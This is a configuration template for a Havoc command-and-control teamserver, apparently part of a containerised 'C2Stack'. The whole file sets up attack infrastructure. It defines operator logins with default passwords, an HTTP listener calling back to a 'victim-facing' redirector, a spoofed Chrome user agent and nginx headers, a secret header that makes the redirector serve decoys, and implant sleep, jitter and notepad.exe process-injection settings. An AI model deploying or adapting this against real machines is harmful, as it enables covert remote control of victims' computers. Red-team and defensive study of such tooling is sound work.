# Havoc teamserver profile for C2Stack - TEMPLATE, rendered by entrypoint.sh.
#
# Every network value below is a placeholder token (double underscore, upper
# snake case) substituted from the environment at container start:
# VICTIM_REDIRECTOR_IP, REDIRECTOR_HTTP_PORT, HAVOC_TS_PORT,
# HAVOC_URI_PREFIX, C2_HEADER_NAME, C2_HEADER_VALUE.
# Never commit a real address, port, path or header here - the teamserver
# bakes these into every Demon at BUILD time, so a stale value fails
# SILENTLY: beacons dial a dead address and nothing reports an error.
# entrypoint.sh refuses to start if any placeholder survives rendering.
# (This paragraph avoids writing the token syntax literally on purpose - the
# entrypoint's leftover-token guard would match it and refuse to boot.)
Teamserver {
    Host = "0.0.0.0"
    Port = __HAVOC_TS_PORT__

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "5pider" {
        Password = "password1234"
    }

    user "Neo" {
        Password = "password1234"
    }
}

Listeners {
    Http {
        Name         = "c2stack - http"
        Hosts        = [
            "__VICTIM_REDIRECTOR_IP__", # victim-facing callback host = the C2Stack redirector (rendered from $VICTIM_REDIRECTOR_IP by entrypoint.sh; NEVER commit a real IP here)
        ]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = __REDIRECTOR_HTTP_PORT__
        PortConn     = __REDIRECTOR_HTTP_PORT__
        Secure       = false # TLS terminates at the redirector; keep off in the DMZ
        KillDate     = "2030-01-01 00:00:00"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

        Uris = [
            "__HAVOC_URI_PREFIX__/"
        ]

        # Routing contract with the C2Stack redirector (Docker/.env):
        # C2_HEADER_NAME: C2_HEADER_VALUE - without it the redirector 404s the
        # path (decoy behavior), so the agent must send it on every request.
        Headers = [
            "__C2_HEADER_NAME__: __C2_HEADER_VALUE__"
        ]

        Response {
            Headers = [
                "Content-Type: text/plain; charset=utf-8",
                "Server: nginx",
                "Access-Control-Allow-Origin: *"
            ]
        }

    }
}

# Required block in the yaotl config grammar (unused by the core flow).
Service {
    Endpoint = "service-endpoint"
    Password = "service-password"
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
